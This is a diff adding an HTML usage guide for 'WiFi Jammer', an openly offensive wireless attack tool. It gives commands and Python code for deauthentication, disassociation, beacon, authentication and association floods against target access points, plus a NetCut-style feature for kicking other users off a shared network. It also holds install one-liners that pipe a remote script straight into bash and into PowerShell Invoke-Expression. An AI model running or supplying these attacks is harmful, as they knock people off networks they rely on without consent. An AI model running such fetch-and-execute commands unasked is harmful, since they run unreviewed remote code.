@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Complete usage guide for WiFi Jammer - installation, CLI, TUI, and GUI usage instructions.">
+    <title>Usage Guide - WiFi Jammer</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <a href="index.html" class="logo">WiFi Jammer</a>
+            <button class="mobile-menu-toggle" aria-label="Toggle menu">☰</button>
+            <ul class="nav-links">
+                <li><a href="index.html">Home</a></li>
+                <li><a href="usage.html">Usage</a></li>
+                <li><a href="demo.html">Demo</a></li>
+                <li><a href="troubleshooting.html">Troubleshooting</a></li>
+                <li><a href="contribute.html">Contribute</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <div class="breadcrumbs">
+            <a href="index.html">Home</a> / Usage Guide
+        </div>
+
+        <section>
+            <h1>Usage Guide</h1>
+            <p>Complete guide to installing and using WiFi Jammer on different platforms and interfaces.</p>
+        </section>
+
+        <section>
+            <h2>Installation</h2>
+
+            <h3>macOS (Automated Setup)</h3>
+            <p>The automated setup script handles everything for you:</p>
+            <pre><code>git clone https://github.com/oyi77/wifi-jammer.git
+cd wifi-jammer
+bash install.sh
+# or for quick install:
+bash quick_install.sh</code></pre>
+            <p>This automatically:</p>
+            <ul class="feature-list">
+                <li>Installs all dependencies</li>
+                <li>Requests Location Services permission</li>
+                <li>Detects which Python has permission</li>
+                <li>Sets everything up for you</li>
+            </ul>
+
+            <h3>One-liner Installation (All Platforms)</h3>
+            <pre><code># Linux/macOS
+curl -sSL https://raw.githubusercontent.com/oyi77/wifi-jammer/main/quick_install.sh | bash
+
+# Windows (PowerShell)
+Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/oyi77/wifi-jammer/main/quick_install.sh" -UseBasicParsing).Content</code></pre>
+
+            <h3>Manual Installation</h3>
+            <pre><code>git clone https://github.com/oyi77/wifi-jammer.git
+cd wifi-jammer
+bash install.sh</code></pre>
+
+            <div class="alert alert-info">
+                <strong>Note:</strong> After installation, you may need to run with <code>sudo</code> for full functionality, especially for attacks.
+            </div>
+        </section>
+
+        <section>
+            <h2>Interface Selection</h2>
+            <p>WiFi Jammer offers three interfaces to suit different preferences:</p>
+
+            <h3>1. Command-Line Interface (CLI)</h3>
+            <p>Traditional terminal-based interface with rich output and progress bars.</p>
+
+            <h3>2. Text User Interface (TUI)</h3>
+            <p>Modern, interactive terminal interface built with Textual framework.</p>
+            <pre><code>sudo wifi-jammer --tui
+# or
+sudo ./wifi-jammer.sh attack --tui</code></pre>
+
+            <h3>3. Graphical User Interface (GUI)</h3>
+            <p>Cross-platform Qt-based graphical interface for Windows, macOS, and Linux.</p>
+            <pre><code>sudo wifi-jammer --gui
+# or
+sudo wifi-jammer-gui
+# or
+sudo ./venv/bin/python3 -m wifi_jammer.gui</code></pre>
+        </section>
+
+        <section>
+            <h2>Command-Line Usage</h2>
+
+            <h3>Network Scanning</h3>
+            <p>Scan for available WiFi networks:</p>
+            <pre><code># Using wrapper script
+./wifi-jammer.sh scan
+
+# Using installed command
+wifi-jammer scan
+
+# With specific interface
+./wifi-jammer.sh scan --interface en0
+
+# With specific channel
+./wifi-jammer.sh scan --interface en0 --channel 6</code></pre>
+
+            <h3>Launching TUI</h3>
+            <pre><code># Using wrapper script
+sudo ./wifi-jammer.sh attack --tui
+
+# Using installed command
+sudo wifi-jammer attack --tui</code></pre>
+
+            <h3>Launching GUI</h3>
+            <pre><code># Using wrapper script
+sudo ./wifi-jammer.sh attack --gui
+
+# Using installed command
+sudo wifi-jammer --gui
+sudo wifi-jammer-gui</code></pre>
+
+            <h3>Direct Attack</h3>
+            <p>Launch an attack directly from the command line:</p>
+            <pre><code># Using wrapper script
+sudo ./wifi-jammer.sh attack --interface en0 --target 00:11:22:33:44:55 --attack deauth
+
+# Using installed command
+sudo wifi-jammer attack --interface en0 --target 00:11:22:33:44:55 --attack deauth
+
+# With additional options
+sudo wifi-jammer attack \
+    --interface en0 \
+    --target 00:11:22:33:44:55 \
+    --attack deauth \
+    --count 100 \
+    --delay 0.1 \
+    --channel 6</code></pre>
+
+            <h3>Scan Only (No Attack)</h3>
+            <pre><code>sudo ./wifi-jammer.sh --scan-only</code></pre>
+        </section>
+
+        <section>
+            <h2>Available Attack Types</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Attack Type</th>
+                        <th>Description</th>
+                        <th>Use Case</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>deauth</code></td>
+                        <td>Deauthentication attack</td>
+                        <td>Disconnect clients from access point</td>
+                    </tr>
+                    <tr>
+                        <td><code>disassoc</code></td>
+                        <td>Disassociation attack</td>
+                        <td>Disassociate clients from network</td>
+                    </tr>
+                    <tr>
+                        <td><code>beacon_flood</code></td>
+                        <td>Beacon flood attack</td>
+                        <td>Flood network with fake access points</td>
+                    </tr>
+                    <tr>
+                        <td><code>auth_flood</code></td>
+                        <td>Authentication flood attack</td>
+                        <td>Overwhelm access point with auth requests</td>
+                    </tr>
+                    <tr>
+                        <td><code>assoc_flood</code></td>
+                        <td>Association flood attack</td>
+                        <td>Overwhelm access point with association requests</td>
+                    </tr>
+                    <tr>
+                        <td><code>probe_response</code></td>
+                        <td>Probe response flood attack</td>
+                        <td>Flood network with probe responses</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <section>
+            <h2>Client Discovery & Selective Kicking</h2>
+            <p>WiFi Jammer includes built-in NetCut-style functionality for discovering and selectively kicking clients.</p>
+
+            <h3>Discovering Connected Clients</h3>
+            <pre><code>sudo ./wifi-jammer.sh --interface en0
+# Select your target network
+# Choose deauth attack
+# Answer "yes" when asked to discover clients</code></pre>
+
+            <p>The tool will:</p>
+            <ol>
+                <li>🔍 Scan for 30 seconds to discover all connected devices</li>
+                <li>📋 Show you a list of discovered clients (excluding your device)</li>
+                <li>🎯 Let you select specific clients to kick OR kick all</li>
+                <li>⚡ Send targeted deauth packets to only those clients</li>
+                <li>💻 Keep you connected while others are kicked</li>
+            </ol>
+
+            <h3>Standalone NetCut Tool</h3>
+            <p>For a dedicated NetCut experience:</p>
+            <pre><code>sudo python3 tools/netcut.py</code></pre>
+            <div class="alert alert-info">
+                <strong>Note:</strong> The NetCut tool requires you to be connected to the target WiFi network first.
+            </div>
+        </section>
+
+        <section>
+            <h2>Command-Line Options</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Option</th>
+                        <th>Short</th>
+                        <th>Description</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>--interface</code></td>
+                        <td><code>-i</code></td>
+                        <td>Wireless interface to use (e.g., en0, wlan0)</td>
+                    </tr>
+                    <tr>
+                        <td><code>--target</code></td>
+                        <td><code>-t</code></td>
+                        <td>Target BSSID (MAC address)</td>
+                    </tr>
+                    <tr>
+                        <td><code>--attack</code></td>
+                        <td><code>-a</code></td>
+                        <td>Attack type (deauth, disassoc, beacon_flood, etc.)</td>
+                    </tr>
+                    <tr>
+                        <td><code>--count</code></td>
+                        <td><code>-c</code></td>
+                        <td>Number of packets to send (0 for unlimited)</td>
+                    </tr>
+                    <tr>
+                        <td><code>--delay</code></td>
+                        <td><code>-d</code></td>
+                        <td>Delay between packets in seconds</td>
+                    </tr>
+                    <tr>
+                        <td><code>--channel</code></td>
+                        <td><code>-ch</code></td>
+                        <td>Channel to use</td>
+                    </tr>
+                    <tr>
+                        <td><code>--verbose</code></td>
+                        <td><code>-v</code></td>
+                        <td>Verbose output</td>
+                    </tr>
+                    <tr>
+                        <td><code>--gui</code></td>
+                        <td></td>
+                        <td>Launch Qt GUI</td>
+                    </tr>
+                    <tr>
+                        <td><code>--tui</code></td>
+                        <td></td>
+                        <td>Launch modern TUI</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <section>
+            <h2>Programmatic Usage</h2>
+            <p>You can also use WiFi Jammer programmatically in your Python scripts:</p>
+
+            <h3>Example: Scan and Attack</h3>
+            <pre><code>from wifi_jammer.core.interfaces import AttackType, AttackConfig
+from wifi_jammer.scanner import ScapyNetworkScanner
+from wifi_jammer.factory import AttackFactory
+from wifi_jammer.utils import RichLogger
+
+# Initialize components
+logger = RichLogger()
+scanner = ScapyNetworkScanner(logger)
+factory = AttackFactory()
+
+# Get available interfaces
+interfaces = scanner.get_interface_list()
+interface = interfaces[0]  # Use first available
+
+# Scan for networks
+networks = scanner.scan_networks(interface)
+
+# Select target network
+target_network = networks[0]
+
+# Create attack configuration
+config = AttackConfig(
+    attack_type=AttackType.DEAUTH,
+    target_bssid=target_network.bssid,
+    target_ssid=target_network.ssid,
+    channel=target_network.channel,
+    interface=interface,
+    count=10,  # Send 10 packets
+    delay=0.5,  # 0.5 second delay
+    verbose=True
+)
+
+# Create and execute attack
+attack = factory.create_attack(AttackType.DEAUTH)
+if attack.execute(config):
+    logger.success("Attack started successfully!")
+    # ... let it run ...
+    attack.stop()</code></pre>
+
+            <h3>Example: Beacon Flood</h3>
+            <pre><code>config = AttackConfig(
+    attack_type=AttackType.BEACON_FLOOD,
+    target_bssid="",  # Not needed for beacon flood
+    interface="wlan0",
+    count=50,
+    delay=0.1,
+    verbose=True
+)
+
+attack = factory.create_attack(AttackType.BEACON_FLOOD)
+if attack.execute(config):
+    # Run for 10 seconds
+    import time
+    time.sleep(10)
+    attack.stop()</code></pre>
+
+            <div class="alert alert-warning">
+                <strong>Important:</strong> All programmatic usage examples require root privileges. Make sure to run your scripts with <code>sudo</code>.
+            </div>
+        </section>
+
+        <section>
+            <h2>Requirements</h2>
+            <ul class="feature-list">
+                <li>Python 3.8+</li>
+                <li>Root privileges (for wireless interface access on Linux/macOS)</li>
+                <li>Wireless interface with monitor mode support</li>
+                <li>Linux, macOS, or Windows (limited functionality)</li>
+            </ul>
+
+            <h3>Dependencies</h3>
+            <ul class="feature-list">
+                <li><strong>scapy:</strong> Packet manipulation</li>
+                <li><strong>netifaces:</strong> Network interface management</li>
+                <li><strong>psutil:</strong> System utilities</li>
+                <li><strong>rich:</strong> Beautiful terminal output</li>
+                <li><strong>click:</strong> CLI framework</li>
+                <li><strong>colorama:</strong> Cross-platform colored output</li>
+                <li><strong>PyQt6:</strong> Cross-platform GUI framework (for GUI mode)</li>
+                <li><strong>textual:</strong> Modern TUI framework (for TUI mode)</li>
+            </ul>
+        </section>
+    </main>
+
+    <footer>
+        <div class="footer-links">
+            <a href="https://github.com/oyi77/wifi-jammer" target="_blank">GitHub Repository</a>
+            <a href="https://github.com/oyi77/wifi-jammer/issues" target="_blank">Report Issues</a>
+            <a href="LICENSE" target="_blank">License (MIT)</a>
+        </div>
+        <p>&copy; 2024 WiFi Jammer Tool. Built by Paijo.</p>
+    </footer>
+
+    <button class="scroll-to-top" aria-label="Scroll to top">↑</button>
+
+    <script src="assets/js/main.js"></script>
+</body>
+</html>
+
